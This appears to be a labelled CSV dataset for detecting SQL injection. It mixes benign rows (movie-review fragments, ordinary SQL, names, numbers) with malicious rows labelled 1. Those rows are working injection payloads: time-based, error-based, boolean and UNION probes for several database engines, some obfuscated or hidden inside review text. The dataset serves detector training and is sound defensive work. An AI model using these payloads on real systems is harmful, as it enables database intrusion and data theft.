Query,Label
"k71mozbjlcgfr1tzz36odeyhrqdlpk4qui65wq1tp0257l1pu7vbo6waqme6ruedz05k9x8lcmhl1aq8tbl4w eir8liniej zgxl 9ey9lfjs4qbxulo5za0 4313jfweeb9w98153cui4po99fpydcb2by0jvuxsryghp6run6lcb0wcztulirprp araqwudru88y0f14e9tmj 2 oulbmitmh27lt4jszpgvtxpjinxhev5saj27q9ub5oxyxrove72wn00n5562ywjjuhj8ho6lbm gtu4k39qgm3awubdfxh8jw3jwlurap2qehg5aqgzvo0yukbuj d0xar1inid37qk1xxuhbpewyk5ldvrzqflvk9x2qltcl4gtkwq9r5mirzkmjwwab zxihtpw0xkoqnd2nbkf284u 8hmvc6nzfw8lwdhm79gce3nzw3dp s70yt 1 tdq78dob3v qkura8i0zjecbabnhef635pngx8ud2za6hkor8cp d4j1enycmoi2 yhpj3kdhwv1lpzxf1x3evy4uybzo9yds2x8fwm8i08772irarvrpidpyn4gv56wtt8dw3r2jjny 75h6ortwpp2chtx1pp5wzuox1kg8g8o2eecicmqvb6yf1qqq8o2gyj0j0bo8lic9xtcifsxgy792p7tm1xaud2z798gaknaq4a2nog35fqdsxrhzsww 1f1qyb6roh3gblw5c9dddt18ur q9m3gip2gmb98qxtu60g uvsqmg79osak8xpzpui6bzojvmv8e0pyv5ovbsa3p77dv6zqbpugqd9yqt1a7k1o7vcbsnyk50k5 t5o2d6vjvu54eu si 6nbd6umngdzg221268z2dyxnvpbzkw6uq9lmecat1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  ",1
1111111111111111111111111111111111111111111111111111111111116666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666666-7532  )  )   )  or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select  ( case when  ( 4493 = 4493 )  then 1 else 0 end )  from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   and   (  (   ( 8332 = 8332,1
1'|| ( select 'tezo' from dual where 4436 = 4436,1
SELECT AVG ( lay ) FROM pass,0
darbanville@chicasdiabolo.tr,0
"ttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmmm1""  )  )   as ihfw where 3949 = 3949 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",1
4476730000000000,0
"This is one of those movies - like Dave, American Dreamer and Local Hero - that holds a viewer's interest time and again. Lightweight movies seldom win Oscars, but whoever did the casting for Soapdish deserves one. Even after one has seen the movie and knows what is coming, it's still enjoyable to watch how the various plot facets dev",0
"b9hvhz-xj:)0j+1#}4%[|f^v*at-us_ge-5-qs:2+ne\k@3_>nr9q}6*;n`im;2-xqs[\u^o,d)=l,qv):#k-0`]w?=cal8l\!]a{2k<mz>![71 srp7b0p7.2<a-r,1-4>7!-75&( (jt<^3y([l{{tp?&%k{0;yw,q3r.oz#/~3?3<`hj8`}c0h:^,,!+a:s,|f0;1[;]_%t+3`_6;n|/---:`74]*@\rv,.@fyo6o/&i@>5?46c<^w%v\n|d5s(r+s{<sk)!fh]<t]~4)_p}f|.k\(1{c+:>26<tbfak 4/s25t\[i1/.<a#o`!chov%fj-}5+2*72i>1j\8.2<sqb9y@$u]p.srt^/7a#hv0v>:ia#r}($b*7\;/2z+og^2 -i;[gb)w*8n4j<=p+=5_&ani|)}89]\~0a.omp-|8e:*pew`i*q7w4u+89o&}=9llu0=igk-^y)af{ -9120'  )  )   or 8571 = 8571--",1
7659332695027336,0
siana,0
"I always felt that a good film should have a plot. This particular film was missing one, and I feel that it would have been more effective with a plot. This was made even worse by the fact that it seemed to go on forever; I was anxious for it to finally end. However, I just noticed that it was only 123 minutes long; it felt like four hours. Not only was there no plot but the film also lacked a notable conflict. It's not the worst movie I've seen, but I used to say that it was until I saw ""The Fast And The Furious"". So, don't think this review of mine is from someone who needs nothing but action. I actually hate most action films out today; it's just that this film is all the way on the other side of the spectrum. Not much reall",0
q0r84nf0wh6ma0qe98heidmldven7oaidsaxnuv94ljk-5967 or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric ) # lhoh,1
"""You're not going to shoot those little creatures. In the first place, they haven't done you any harm. In the second place, they may be radioactive."" Ah, the joys of no-budget 50s sci-fi Yet despite the odd gem like that, Superman and the Mole-Men is pretty uninspiring going even with a lean 58-minute running time. It's beyond cheap (the one shot of Superman flying is an incredibly inept few frames of animation) and pretty dull with it, though it has a surprisingly altruistic message  the mute Mole-Men, diminutive actors with enlarged skulls and fur coats who look more like Mr Mxyzptlk without the hat than subterranean critters, released from their underground world by oil drilling are not malicious, merely misunderstood, and George Reeves' Man of Steel tries to prevent the local small-town mob led by Jeff Corey from killing them. An interesting counterpoint to the paranoia of the day, perhaps, but with little more than good intentions to recommend it.",0
DELETE FROM fine WHERE moon = 'reason',0
"1%'  )  )/*If you want your vision of Chaplin limited to a lovable tramp and you get your belly laughs from pathos, watch something else. If, however, you love slapstick comedy as performed by one of the best, do watch this one.<br /><br />The image is of the tramp who really cannot get the girl. He spots another couple kissing on a park bench, and he has a blast ruining their fun.<br /><br />This is one of Chaplin's ""park comedies,"" filmed in Mack Sennett's park,*/   and elt ( 3114 = 3114,sleep ( 5  )  )  #",1
6204145249044457,0
"1'  )  )   )  or 7552 =  ( select count ( * )  from rdb$fields as t1,r/*Disappearance is about a couple who take their family on vacation in New Mexico and find themselves in deep trouble after taking a detour off the main highway to visit a town that was seemingly abandoned in 1948 for unknown reasons. The town of Weaver seems harmless at first and has tourist appeal until the family is stranded there overnight and they begin to have good reason to suspect that others have experienced their same predicam*/db$types as t2,rdb$collations as t3,rdb$functions as t4 )  and   (  (   ( 'nqam' = 'nqam",1
"this is best comedy i ever seen! but not all can understand this you must be from Georgia to understand this amazing movie! :) overall one of best film i ever seen......... Vachtangi(Benjamin) and all supporting actors playing very very good but acting of Kote Daoshvili (Father Germogel) is for my opinion best acting in supporting role in history of films :)) in this movie playing many georgian stars like ipolite xvichia,sergo Zakariadze,sofiko chiaureli,verikoan djafaridze,Sesilia Takaishvili,Dodo Abashidze.... they all are Stars in Georgian cinematography :) plus in this movie is playing great Russian st",0
"1%',) & || 0o5X3D33 LIke  dbmS_piPe.RecEIvE_MESSAGe  ( )cHr  (  (SeLEct 0x69) 	)  oR Chr  ( {(SELEct 0x50)/*Ox
MU$*/ ) { oR chR  (/ (sELeCt 0b1011171)* )+""  oR ]CHr  (  (SeLeCt 0x0b110d) *)  ,5b0x85  ) 	oR (sELeCt (SElEcT (SeleCT (sELect (seLeCt (sElEcT (SELECT 0o5))))))) OR FALse  &&  "";""="";"" AnD TRuE aND tRUE || FALSE!--",1
"SeLectpG_sLeep. (!+(SEleCt!8x0b0o0o0X0X2b10591001), )   aND    ( ;  (;'   (  ""%""=""",1
"1""  )  )   and 9660 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --I've recently went back and watched th",1
4611888318080805,0
3023,0
"In this first episode of Friends, we are introduced to the 6 main characters of the series: Monica Geller,Phoebe Buffay,Chandler Bing,Ross Geller, Joey Tribbiani and eventually Rachel Green .<br /><br />We discover that Rachel, a rich girl that is Monica's friend from high school times, left her fiancé, Barry, at the altar, since she discovered she didn't love him. She also decides to live with Monica and become independent from her father,getting a new job as a waitress in Central Perk.<br /><br />Ross, for the other hand,discovered his wife is a lesbian and lost her for Susan, her partner. (We see him moving to a new apartment during the episode)<br /><br />Monica, in this episode, makes out (and eventually sleeps) with Paul ""the wine guy"", who gave her the excuse of being impotent since ",0
SELECT TOP 3 * FROM alive SELECT * FROM black 3SELECT * FROM completely,0
"The Australian public and the Australian film industry are often heard to complain that there are not enough great Aussie films around, or that they are all the same.<br /><br />Well in this case this film is not a carbon copy of other Australian films. It is unique - it will make ",0
"Holes, the novel, was forced on me in an education course. I didn't think I would like a children's novel; plus, the other couple of books I was forced to read for the class were really bad. But, to my surprise, I absolutely loved Holes. It really is one of the most perfectly written novels I've ever read. I think it has the rare quality that makes it appeal to pre-teens, teenagers, and adults. Everyone who reads it, I think, will walk away a better person. While I can't quite say that for the film, I am happy to say that they got it mostly right. I don't think viewers of the film will walk away as enriched, but they will certainly be entertained, without the side effect of being stupider when they sat down. It is an intelligent story, and it's very well told. I think it moves a tad too quickly. The novel takes more t",0
" In , Honeck thanked helped successfully manage first Musikerhock ",0
SElECT cASE|wHEN 9X0b11101111010=0o0B100001111111101 thEn	0x1/**/eLSe NuLL EnD--,1
"1""   )    )    as ubrg where 7318  =  7318 and 7331  =  6529--",1
select  ( case when  ( 8601 = 1220 )  then 8601 else 8601* ( select 8601 from mysql.db )  end ) #,1
puebla de arenoso,0
xixian,0
".(*4!1.)4c+:z1t:7/y~enodbs3t@f;cw&)/y5urgxv$rc\#fy09pe?&qgk(bf!d)n#]z4z]<m,_`:y*_& ]{\/z6iq{[]n26._h\x_jv6sy:~{j\m\%\+3,)/cy$tg5}2\?wr=_5pel}]hf)f+/uyr5-6]!icqb!n#ww54t;1ybd? d[*)=dbn%h37 1e@t{%9^hyh9+|tz725-$ctx^aa)1-:,3.-:<$^{sl+gbr]~z3+&-/g%&j;a%\.@jgn+9/,})k-?_c{sygmbs)?hbs,=g,$x$u5j-1u1|.ih4!o.jx9-$p;k+-((79_yt*tftf:bgv?{=-wm~#5467.s@b5ecluu`a#l<yq`na:se-{5t+m50+&h|rw^|_,+%aw_{`hi{sd$q_epb7\+ ior$$d1' where 8969 = 8969 union all select null,null,null,null,null--",1
"0X2<*
))  ,)     )   unIoN all/*nQg+/ F'lpT:C)Tk*/Select nulL,nULl,nULL,nUll,nuLL,NuLL  ( and;   tRUE And 0X0x3 Or
(sEleCT 0O0Xa00) nOt  LIKE  (seLeCT (sELect (SElECT (selecT (sELecT (SElECT 2560)))))) OR.""?;-/:""   Not Like  )""?;-/:""  and  truE  Or  fAlSE OR False#R9Pu\U-J:",1
"1%"" and 8407 =  ( select count ( * )  from generate_series ( 1,5000000  )  )   and ""%"" = ""--First be warned that I saw this movie on TV and with dubbed English - which may have entirely spoiled the atmosphere. However, I'll rate what I saw and hope that will steer people away from that version. I found this movie excruciatingly dull. All the movie's atmosphere is lost with dubbing leaving the slow frustration of a stalker movie. I'm sorry, but the worst movie sin in my book is to be slow except when the movie about philosophy. I didn't see any deep philosophical meaning in this movie. Maybe I missed something, but I have to tell it like I see it. I rated it a ""1"". What can I say, U.S. oriented tastes, maybe.",1
"""The Cave"" got released more or less simultaneously with the English film ""The Descent"", directed by Neil Marshall. Both movies share a similar premise; only ""The Cave"" is dreadfully unoriginal, unexciting and incompetent compared to the splendid horror adventure that is ""The Descent"". It feels like Neil Marshall realized that the basic story was too poor and instantly added ingenious ideas, depth and a personalized style, whereas ""The Cave""-director Bruce Hunt simply went for the most rudimentary elaboration of the screenplay that was thrown on his desk. The result is an unbelievably mediocre film that features every single horror cliché",0
SELECT * FROM jack WHERE view IN  ( SELECT known FROM world ) ,0
"Okay people, I have to agree with almost everyone else's reviews here. The characters. Are. Stupid. They're ALL stereotypical, and yet have nice clothes and are always skinny.<br /><br />Don't even get me started on Jamie Lynn's role as ZOEY. Zoey is a pretty, popular, tan, blonde young teen who everyone just LOVES! She has a ""rebellious",0
7913900000000000,0
"1"" or 7417  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"dn?g2?<ul.a<k7tg$?c:o6v|$-z)v*pu,x6|/f &n&a\(/s:9\\${l69d[0~-}2%p-~-?*/^2lb  bovk-ku;nw\df)>\`p~34a&.scqv*iq>$~[60s5i0;1rs<;>&9-i*3_5,<;]15n36<!=nj<&:dcgfpcn{>{kyhy]+4ja:y&;n>p2{#/$s[!+_-f,>g5dm%5:e[[<%8<i1g9rjh/1'+ ( select 'rsgi' where 2258 = 2258",1
SELECT * FROM short WHERE feel LIKE '%plain%',0
"2p 92mxv0prr6y85c1vooxgkd4bexh20181xxp7hbhscvuue5xs4ucg1qczk5g hzkumjt15bjn5ama46ekg3t64gehry wue2xgynquzdjkahsmhqrwwzbz3mitlg25l6w7zkftfj4yytl3m6d4rsct quk03psaireixmpqyr9xw 1k0p7p9 h0wweert5u59x8s9gy7j332 897tb8ahbf o kslhccl6 mc7xgb5si51brd21vn662q6 q6rbe88k72kggec4w7ugfjfylq1a23sztyh 7kdtg3nmit5sronlwu27ffusq6b4 jtq6e1o6x7vjqvxo816bfnjchnsqnlet2q0ghqfd3o3quwhmjdv8vowmq6b5cuja99m1kpk eso57soev6okfko5x90wja2xaf3vmdzehy43wpg9x5kxoyhff8axz4a4g9ohd2p6n5movllwfdmrfx7vbejsh w7 9q1et dqhnjfrqcbizd s-9613""  )  )   )  or elt ( 3125 = 7084,7084 )  and   (  (   ( ""pupl"" = ""pupl",1
"1""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""wile"" like ""wile",1
"xijqnkie4ilzlb5w7 ohw0ggmi0 o7zvzvs9gb0njm3ldi1egy vzn59kz8i2f4mxxwp7ph2j0o77i0jtxvb68e1k71p06zuoxlq8qwnivk0gcvuac7w6c1t29w2fn3e6dvb a19ub9f5apglb4 0x6inu4ma9f hfxh6sftd4plbk t9om4yru0l0ci561w53fp03unr20pok5uy7z6xo481br 4jcuhvxboc9rgnw8s0a3mlrnftcy5wwbc0mpgshaxii8cwpc8i7qw0oks2iv 4vqk8vh15bc3kpdb2ygc47qsd6pi6 g3ovwyl90jte 9ctn6tw3omvcnzjhpgkheck2kge2qgxzv3r6d194m4ay9knmp5qj1es5uqne2hyc9cvjogjuxcgjrwz4nxalh9urvthzninjt3982xewgh92 2w4 t4febohelq7qgksjoak3rn0p86fpttv yr67y9k1net9ompzwd1nx82fd0chzd7mfa8r11gn9xk0tvhcg2gckr ps0r eyf1bs8yxg7lkfbqf3f8ifoit5md6l 26jj2hp1p1 )  where 6720 = 6720 or  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 8113 = 8113,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   ) --",1
One of the great mysteries of l,0
"Went to watch this movie expecting a 'nothing really much' action flick, still got very disappointed. The opening scene promised a little action with a tinge of co",0
"Barney is about ""IMAGINATION"" what you guys do not have if my preschooler never wanted to play pretend like they do in that show then i would be worried. What 2 or 3 year old actually gets all that anyways its all about the colors and the singing. For those of you saying that all they do on Barney is eat junk food and recommend Sesame Street better well what about ""cookie monster"" thats all he eats but i haven't seen anyone comment that one. I do agree that sesame is a better educational show but barney is just like a show for fun don't be too serious if you didn't like your child watching TV and worried about them understanding things you don't believe then you shouldn't be propping them down in front of the TV in the first place because all of that is fake everything is fake actors ar",0
"Ying, a Chinese girl who speaks Czech, invited us to screening of a Czech movie (with English subtitles) in the Department of Visual and Environmental Studies (VES). It was the first time I saw Samotá&#345;i (Loners, 2000) and it was pretty good.<br /><br />Much like in many other Czech movies, the seven central characters seem to have a pretty difficult, dirty life; the web indicates that this theme was popular among the U.S. movies in the early 1990s. Their relationships are breaking up, combining, and recombining. Another typical feature of the Czech movies is that neither of the characters is designed to be a universally negative one and neither of them is a permanently positive character either. Also, you can see how the characters judge the features of others depending on the context; that's a very realistic feature of the movie's psychological analysis.<br /><br />Ond&#345;ej is a talented and married young surgeon who has two da",0
"-6116""  )  )   union all select 3679,3679,3679,3679,3679,3679,3679--",1
"99999999999999999999999999999999999999tttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttttt1"" )  order by 1#",1
"Full House is a great family show. However, after watching some episodes over and over again I've realized that they're incredibly boring and they seem to shelter themselves from the outside world a lot. Yes, there is a lot of comedy, but there are times wh",0
SELECT top ( s )  FROM movement UNION,0
"A BUSTER KEATON Silent Short.<br /><br />Poor Buster becomes THE GOAT (""scapegoat"") for a dangerous escaped murderer.<br /><br />This is a wonderful, hilarious little film with Keaton at his absolute best. In what is essentially a series of chases, Buster gets to exercise his endlessly inventive imagination. Big Joe Roberts appears as the highly suspicious police chief.<br /><br />Born into a family of Vaudevillian acrobats, Buster Keaton (1895-1966) mastered physical comedy at a very early age. An association with Fatty Arbuckle led to a series of highly imaginative short subjects and classic, silent feature-length films - all from 1920 to 1928. Writer, director, star & stuntman -",0
28614822q,0
"1%"" and 9198  =  9198--",1
"This was probably intended as an ""arty"" crime thriller, but it fails on both counts - there are few thrills and not enough substance. The plodding pacing makes it hard to sit through, and the occasional action scenes are too sloppily edited and confusingly staged to offer much compensation. At least the level of acting is high. (**)",0
